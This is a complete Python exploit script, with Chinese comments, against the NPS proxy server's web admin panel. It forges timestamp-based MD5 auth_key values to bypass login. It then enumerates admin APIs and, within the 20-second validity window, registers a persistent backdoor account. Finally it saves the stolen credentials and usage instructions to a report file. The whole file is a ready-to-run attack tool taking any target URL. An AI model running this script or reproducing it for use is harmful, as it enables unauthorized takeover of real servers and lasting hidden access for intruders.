#!/usr/bin/env python3
"""
NPS登录绕过与持久化攻击完整脚本
版本: 3.0 (集成账户持久化功能)
描述: 针对NPS的登录绕过漏洞，并在20秒窗口期内创建持久化账户
用法: python3 nps_full_exploit.py http://target:port
https://github.com/Domren/POC/
"""

import requests
import time
import hashlib
import json
import sys
import random
import string
from datetime import datetime
import os

requests.packages.urllib3.disable_warnings()

class NPSExploit:
    def __init__(self, target_url):
        self.target = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 10
        
        # 美化输出
        self.colors = {
            'blue': '\033[94m',
            'green': '\033[92m',
            'yellow': '\033[93m',
            'red': '\033[91m',
            'cyan': '\033[96m',
            'reset': '\033[0m'
        }
    
    def print_header(self):
        """打印美观的头部"""
        header = f"""
{self.colors['cyan']}{'='*60}{self.colors['reset']}
{self.colors['cyan']}[*] NPS登录绕过与持久化攻击脚本{self.colors['reset']}
{self.colors['cyan']}[*] 目标: {self.target}{self.colors['reset']}
{self.colors['cyan']}{'='*60}{self.colors['reset']}
"""
        print(header)
    
    def print_step(self, message, color='blue'):
        """打印步骤信息"""
        print(f"{self.colors[color]}[*] {message}{self.colors['reset']}")
    
    def print_success(self, message):
        """打印成功信息"""
        print(f"{self.colors['green']}[+] {message}{self.colors['reset']}")
    
    def print_warning(self, message):
        """打印警告信息"""
        print(f"{self.colors['yellow']}[!] {message}{self.colors['reset']}")
    
    def print_error(self, message):
        """打印错误信息"""
        print(f"{self.colors['red']}[-] {message}{self.colors['reset']}")
    
    def print_debug(self, message):
        """打印调试信息"""
        print(f"{self.colors['cyan']}[DEBUG] {message}{self.colors['reset']}")
    
    def detect_config(self):
        """探测目标配置"""
        self.print_step("开始探测目标配置...")
        
        try:
            resp = self.session.get(f"{self.target}/auth/getauthkey")
            if resp.status_code == 200:
                data = resp.json()
                crypt_key = data.get('crypt_auth_key', '')
                
                if crypt_key == "5acabcf051cd55abca03d18294422e01":
                    self.print_success("发现默认密文! auth_key被注释")
                    return 'default_commented'
                else:
                    self.print_warning(f"发现自定义密文: {crypt_key[:16]}...")
                    return 'custom_config'
        except:
            pass
        
        self.print_warning("无法获取配置信息，尝试默认绕过")
        return 'unknown'
    
    def test_bypass(self):
        """测试登录绕过"""
        self.print_step("开始尝试登录绕过...")
        
        # 测试时间戳范围
        base_ts = int(time.time())
        timestamps = [base_ts, base_ts-1, base_ts+1, base_ts-2, base_ts+2]
        
        for ts in timestamps:
            self.print_debug(f"测试时间戳: {ts}")
            
            # 生成认证参数
            auth_key = hashlib.md5(str(ts).encode()).hexdigest()
            url = f"{self.target}/index/index?auth_key={auth_key}&timestamp={ts}"
            
            try:
                resp = self.session.get(url, allow_redirects=False)
                
                # 检查是否成功
                if resp.status_code == 302:
                    location = resp.headers.get('Location', '')
                    if 'login' not in location.lower():
                        self.print_success(f"绕过成功! /index/index - 重定向到管理页面")
                        return True, auth_key, ts, url
                
                elif resp.status_code == 200:
                    content = resp.text.lower()
                    # 成功指标计数
                    success_indicators = ['dashboard', '控制面板', '客户端', 'tunnel', 'nps']
                    match_count = sum(1 for indicator in success_indicators if indicator in content)
                    
                    if match_count >= 2:
                        self.print_success(f"绕过成功! /index/index - 成功匹配 {match_count} 个成功指标")
                        return True, auth_key, ts, url
                        
            except Exception as e:
                continue
        
        return False, None, None, None
    
    def test_api_access(self, auth_key, timestamp):
        """测试管理API访问权限"""
        self.print_step("测试管理API访问权限...")
        
        accessible_apis = []
        test_apis = [
            ("/client/list", "GET"),
            ("/index/gettunnel", "GET"),
            ("/index/getindex", "GET")
        ]
        
        for api_path, method in test_apis:
            try:
                url = f"{self.target}{api_path}?auth_key={auth_key}&timestamp={timestamp}"
                
                if method == "GET":
                    resp = self.session.get(url)
                else:
                    resp = self.session.post(url, data={})
                
                if resp.status_code == 200:
                    try:
                        json.loads(resp.text)  # 验证是否为JSON
                        accessible_apis.append(api_path)
                        self.print_success(f"API可访问: {api_path}")
                    except:
                        pass
            except:
                continue
        
        if accessible_apis:
            self.print_success(f"可访问 {len(accessible_apis)} 个管理API")
        
        return accessible_apis
    
    def create_persistent_account(self, auth_key, timestamp):
        """创建持久化账户"""
        self.print_step("尝试创建持久化账户...")
        
        # 生成随机账户
        rand_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        account_info = {
            'username': f'nps_user_{rand_str}',
            'password': f'Nps@2024{rand_str}',
            'email': f'nps_{rand_str}@local.local'
        }
        
        self.print_step(f"账户信息: {account_info['username']}/{account_info['password']}")
        
        # 计算剩余时间
        time_diff = abs(int(time.time()) - timestamp)
        remaining = 20 - time_diff
        self.print_step(f"时间窗口: {remaining}秒")
        
        if remaining <= 2:
            self.print_warning("时间窗口不足，跳过账户创建")
            return None
        
        # 步骤1: 检查注册功能
        self.print_step("步骤1: 检查注册功能...")
        
        # 先尝试直接访问注册页面
        register_enabled = False
        try:
            register_url = f"{self.target}/index/index?auth_key={auth_key}&timestamp={timestamp}"
            resp = self.session.get(register_url)
            if '注册' in resp.text:
                register_enabled = True
                self.print_success("注册功能已开启")
        except:
            pass
        
        if not register_enabled:
            self.print_warning("注册功能未开启或无法访问")
            return None
        
        # 步骤2: 注册新账户
        self.print_step("步骤2: 注册新账户...")
        
        # 尝试注册
        register_success = False
        try:
            register_urls = [
                f"{self.target}/login/register?auth_key={auth_key}&timestamp={timestamp}",
                f"{self.target}/register?auth_key={auth_key}&timestamp={timestamp}"
            ]
            
            for reg_url in register_urls:
                try:
                    data = {
                        "username": account_info['username'],
                        "password": account_info['password'],
                        "confirm_password": account_info['password'],
                        "email": account_info['email']
                    }
                    
                    resp = self.session.post(reg_url, data=data)
                    if resp.status_code == 200:
                        if '成功' in resp.text or 'success' in resp.text.lower():
                            register_success = True
                            self.print_success("账户注册成功")
                            break
                except:
                    continue
        except Exception as e:
            self.print_debug(f"注册异常: {e}")
        
        if not register_success:
            self.print_error("账户注册失败")
            return None
        
        # 步骤3: 尝试登录验证
        self.print_step("步骤3: 验证账户登录...")
        
        login_success = False
        try:
            login_urls = [
                f"{self.target}/login/verify",
                f"{self.target}/login/check"
            ]
            
            for login_url in login_urls:
                try:
                    # 创建新会话测试登录
                    test_session = requests.Session()
                    test_session.verify = False
                    
                    data = {
                        "username": account_info['username'],
                        "password": account_info['password']
                    }
                    
                    resp = test_session.post(login_url, data=data)
                    if resp.status_code == 200:
                        if 'dashboard' in resp.text.lower():
                            login_success = True
                            account_info['cookies'] = test_session.cookies.get_dict()
                            self.print_success("账户登录验证成功")
                            break
                except:
                    continue
        except Exception as e:
            self.print_debug(f"登录验证异常: {e}")
        
        if login_success:
            return account_info
        else:
            self.print_warning("账户登录验证失败")
            return None
    
    def save_results(self, bypass_success, account_info, accessible_apis):
        """保存结果到文件"""
        timestamp = int(time.time())
        filename = f"nps_exploit_{timestamp}.txt"
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write("=" * 60 + "\n")
                f.write("NPS漏洞利用报告\n")
                f.write(f"生成时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"目标: {self.target}\n")
                f.write("=" * 60 + "\n\n")
                
                f.write("[漏洞状态]\n")
                f.write(f"  登录绕过: {'成功' if bypass_success else '失败'}\n")
                
                if bypass_success and account_info:
                    f.write(f"  持久账户: 创建成功\n")
                    f.write(f"    用户名: {account_info['username']}\n")
                    f.write(f"    密码: {account_info['password']}\n")
                    f.write(f"    邮箱: {account_info['email']}\n")
                elif bypass_success:
                    f.write(f"  持久账户: 创建失败\n")
                
                f.write(f"  可访问API: {len(accessible_apis)}个\n")
                for api in accessible_apis:
                    f.write(f"    - {api}\n")
                
                f.write("\n[使用说明]\n")
                f.write("  1. 使用生成的账号密码登录管理后台\n")
                f.write("  2. 或使用绕过URL直接访问（20秒有效）\n")
                f.write("=" * 60 + "\n")
            
            self.print_step(f"文本报告已保存到: {filename}")
        except Exception as e:
            self.print_error(f"保存报告失败: {e}")
    
    def print_summary(self, bypass_success, bypass_url, account_info, accessible_apis):
        """打印结果摘要"""
        summary = f"""
{self.colors['cyan']}{'='*60}{self.colors['reset']}
{self.colors['cyan']}攻击结果摘要{self.colors['reset']}
{self.colors['cyan']}{'='*60}{self.colors['reset']}
"""
        print(summary)
        
        if bypass_success:
            current_time = int(time.time())
            ts = int(bypass_url.split('timestamp=')[-1])
            remaining = 20 - (current_time - ts)
            
            if remaining > 0:
                status = "✅ 完全成功" if account_info else "⚠️ 部分成功"
                print(f"总体状态: {status}")
                print()
                
                print(f"绕过URL (第一个):")
                print(f"  {bypass_url}")
                print(f"  有效期: 约{remaining}秒")
                print()
                
                if account_info:
                    print(f"持久化账户:")
                    print(f"  用户名: {account_info['username']}")
                    print(f"  密码: {account_info['password']}")
                    if 'cookies' in account_info:
                        print(f"  Cookie: {account_info['cookies']}")
                    print()
                
                print(f"可访问管理API:")
                for api in accessible_apis:
                    print(f"  - {api}")
            else:
                print("总体状态: ⚠️ 时间窗口已过期")
        else:
            print("总体状态: ❌ 登录绕过失败")
        
        print(f"{self.colors['cyan']}{'='*60}{self.colors['reset']}")
    
    def run(self):
        """执行漏洞利用"""
        self.print_header()
        
        # 1. 探测配置
        config_status = self.detect_config()
        
        # 2. 测试登录绕过
        bypass_success, auth_key, timestamp, bypass_url = self.test_bypass()
        
        if not bypass_success:
            self.print_error("登录绕过失败")
            self.print_summary(False, None, None, [])
            return
        
        self.print_success(f"登录绕过成功! 获得 1 个有效入口")
        
        # 3. 测试API访问
        accessible_apis = self.test_api_access(auth_key, timestamp)
        
        # 4. 尝试创建持久账户（在时间窗口内）
        account_info = None
        current_time = int(time.time())
        time_diff = abs(current_time - timestamp)
        
        if time_diff <= 18:  # 留2秒余量
            remaining = 20 - time_diff
            self.print_step(f"剩余时间窗口: {remaining}秒，尝试创建持久账户...")
            account_info = self.create_persistent_account(auth_key, timestamp)
        else:
            self.print_warning("时间窗口已过，跳过创建账户")
        
        # 5. 保存结果
        self.save_results(bypass_success, account_info, accessible_apis)
        
        # 6. 打印摘要
        self.print_summary(bypass_success, bypass_url, account_info, accessible_apis)

def main():
    if len(sys.argv) < 2:
        print("使用方法:")
        print(f"  {sys.argv[0]} <目标URL>")
        print("\n示例:")
        print(f"  {sys.argv[0]} http://192.168.1.100:8080")
        sys.exit(1)
    
    target = sys.argv[1]
    
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    try:
        exploit = NPSExploit(target)
        exploit.run()
    except KeyboardInterrupt:
        print("\n[!] 用户中断")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] 错误: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
